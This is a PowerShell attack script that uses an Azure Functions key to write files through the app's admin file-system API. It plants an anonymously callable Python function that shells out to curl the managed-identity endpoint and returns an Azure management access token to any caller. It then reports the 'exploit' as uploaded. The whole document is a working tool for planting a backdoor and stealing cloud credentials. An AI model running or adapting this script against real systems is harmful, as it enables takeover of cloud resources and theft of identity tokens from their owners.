param($credentials, $domain, $app_name)

Write-Host "credentials: $credentials"
Write-Host "domain: $domain"
Write-Host "Application Name: $app_name"

$headers = @{
                "Content-Type" = "application/octet-stream"
                "x-functions-key" = "$credentials"
            }




$URL = "https://$domain/admin/vfs/home/site/wwwroot/HttpTrigger1/__init__.py"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = $headers
}
$result = Invoke-RestMethod @Params -UseBasicParsing

if($result -ne "" -and $result -ne $null)
{
    Write-Host "Permissions validate successfull"
    #Put data on functional app:

    $URL = "https://$domain/admin/vfs/home/site/wwwroot/$app_name/__init__.py"
    $Params = @{
        "URI" = $URL
        "Method" = "PUT"
        "Headers" = $headers
    }

$Body = @"
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
"@
Invoke-RestMethod @Params -UseBasicParsing -Body $Body
    $URL = "https://$domain/admin/vfs/home/site/wwwroot/$app_name/__init__.py"
    $Params = @{
        "URI" = $URL
        "Method" = "GET"
        "Headers" =$headers
    }
    $result = Invoke-RestMethod @Params -UseBasicParsing
    if($result -ne "" -and $result -ne $null)
    {
        Write-Host "Put impersonation source code success"
        # FUnctional app configuration file

        $URL = "https://$domain/admin/vfs/home/site/wwwroot/$app_name/function.json"
        $Params = @{
            "URI" = $URL
            "Method" = "PUT"
            "Headers" = $headers
        }
$Body_config = @"
{
    "bindings": [
        {
            "authLevel": "anonymous",
            "type": "httpTrigger",
            "direction": "in",
            "name": "req",
            "methods": [
                "get",
                "post"
            ]
        },
        {
            "type": "http",
            "direction": "out",
            "name": "`$return"
        }
    ]
}
"@
Invoke-RestMethod @Params -UseBasicParsing -Body $Body_config

        #validate content of funcitonal app configuration file

        $URL = "https://$domain/admin/vfs/home/site/wwwroot/$app_name/function.json"
        $Params = @{
            "URI" = $URL
            "Method" = "GET"
            "Headers" = $headers
        }
        $result=Invoke-RestMethod @Params -UseBasicParsing
        if($result -ne "" -and $result -ne $null){
            Write-Host "Exploit funtional application succefully uploaded : https://$domain/api/$app_name"
        }
    }
}
